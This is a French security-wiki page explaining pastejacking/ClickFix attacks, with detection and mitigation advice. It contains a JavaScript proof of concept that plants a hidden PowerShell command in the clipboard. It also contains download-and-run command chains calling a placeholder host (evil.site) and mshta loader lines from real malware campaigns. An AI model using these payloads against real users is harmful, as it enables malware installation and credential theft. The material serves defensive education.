# Attaques de détournement du presse-papiers (Pastejacking)

{{#include ../../banners/hacktricks-training.md}}

> "Ne collez jamais quoi que ce soit que vous n'avez pas copié vous-même." – un conseil ancien mais toujours valable

## Aperçu

Le détournement du presse-papiers – également connu sous le nom de *pastejacking* – abuse du fait que les utilisateurs copient et collent régulièrement des commandes sans les inspecter. Une page web malveillante (ou tout contexte capable de JavaScript tel qu'une application Electron ou de bureau) place de manière programmatique du texte contrôlé par l'attaquant dans le presse-papiers du système. Les victimes sont encouragées, généralement par des instructions de manipulation sociale soigneusement élaborées, à appuyer sur **Win + R** (dialogue Exécuter), **Win + X** (Accès rapide / PowerShell), ou à ouvrir un terminal et *coller* le contenu du presse-papiers, exécutant immédiatement des commandes arbitraires.

Parce que **aucun fichier n'est téléchargé et aucune pièce jointe n'est ouverte**, la technique contourne la plupart des contrôles de sécurité des e-mails et du contenu web qui surveillent les pièces jointes, les macros ou l'exécution directe de commandes. L'attaque est donc populaire dans les campagnes de phishing livrant des familles de logiciels malveillants courants telles que NetSupport RAT, Latrodectus loader ou Lumma Stealer.

## Preuve de concept JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Les anciennes campagnes utilisaient `document.execCommand('copy')`, les nouvelles s'appuient sur l'**API Clipboard** asynchrone (`navigator.clipboard.writeText`).

## Le Flux ClickFix / ClearFake

1. L'utilisateur visite un site avec une faute de frappe ou compromis (par exemple `docusign.sa[.]com`)
2. Un JavaScript **ClearFake** injecté appelle un helper `unsecuredCopyToClipboard()` qui stocke silencieusement une ligne de commande PowerShell encodée en Base64 dans le presse-papiers.
3. Des instructions HTML disent à la victime : *“Appuyez sur **Win + R**, collez la commande et appuyez sur Entrée pour résoudre le problème.”*
4. `powershell.exe` s'exécute, téléchargeant une archive contenant un exécutable légitime plus une DLL malveillante (sideloading classique de DLL).
5. Le chargeur déchiffre des étapes supplémentaires, injecte du shellcode et installe une persistance (par exemple, une tâche planifiée) – exécutant finalement NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemple de chaîne NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart légitime) recherche dans son répertoire `msvcp140.dll`.
* Le DLL malveillant résout dynamiquement les API avec **GetProcAddress**, télécharge deux binaires (`data_3.bin`, `data_4.bin`) via **curl.exe**, les déchiffre en utilisant une clé XOR roulante `"https://google.com/"`, injecte le shellcode final et décompresse **client32.exe** (NetSupport RAT) dans `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Télécharge `la.txt` avec **curl.exe**
2. Exécute le téléchargeur JScript à l'intérieur de **cscript.exe**
3. Récupère un payload MSI → dépose `libcef.dll` à côté d'une application signée → chargement latéral de DLL → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
L'appel **mshta** lance un script PowerShell caché qui récupère `PartyContinued.exe`, extrait `Boat.pst` (CAB), reconstruit `AutoIt3.exe` via `extrac32` et la concaténation de fichiers, et enfin exécute un script `.a3x` qui exfiltre les identifiants de navigateur vers `sumeriavgv.digital`.

## Détection & Chasse

Les équipes bleues peuvent combiner la télémétrie du presse-papiers, de la création de processus et du registre pour identifier les abus de pastejacking :

* Registre Windows : `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` conserve un historique des commandes **Win + R** – recherchez des entrées Base64 / obfusquées inhabituelles.
* ID d'événement de sécurité **4688** (Création de processus) où `ParentImage` == `explorer.exe` et `NewProcessName` dans { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* ID d'événement **4663** pour les créations de fichiers sous `%LocalAppData%\Microsoft\Windows\WinX\` ou dans des dossiers temporaires juste avant l'événement 4688 suspect.
* Capteurs de presse-papiers EDR (si présents) – corrélez `Clipboard Write` suivi immédiatement d'un nouveau processus PowerShell.

## Atténuations

1. Renforcement du navigateur – désactivez l'accès en écriture au presse-papiers (`dom.events.asyncClipboard.clipboardItem` etc.) ou exigez un geste de l'utilisateur.
2. Sensibilisation à la sécurité – apprenez aux utilisateurs à *taper* des commandes sensibles ou à les coller d'abord dans un éditeur de texte.
3. Mode de langue contraint PowerShell / Politique d'exécution + Contrôle des applications pour bloquer les lignes de commande arbitraires.
4. Contrôles réseau – bloquez les requêtes sortantes vers des domaines de pastejacking et de C2 de logiciels malveillants connus.

## Astuces connexes

* Le **Détournement d'invitation Discord** abuse souvent de la même approche ClickFix après avoir attiré les utilisateurs dans un serveur malveillant :
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Références

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
